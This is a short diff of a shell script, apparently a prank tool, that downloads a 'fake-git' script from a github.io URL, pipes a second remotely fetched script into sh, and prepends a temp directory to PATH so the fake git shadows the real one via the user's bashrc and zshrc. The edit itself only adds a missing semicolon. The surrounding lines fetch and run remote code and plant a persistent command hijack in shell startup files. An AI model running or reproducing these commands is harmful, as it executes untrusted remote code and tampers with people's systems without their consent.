@@ -6,4 +6,4 @@ curl "https://d-002.github.io/epita/confloose/fake-git/git.sh" >> "$tempdir/git"
 chmod +x "$tempdir/git"
 
 echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-git" "'export PATH=\"$tempdir:\$PATH\"'" | sh
-for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
+for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
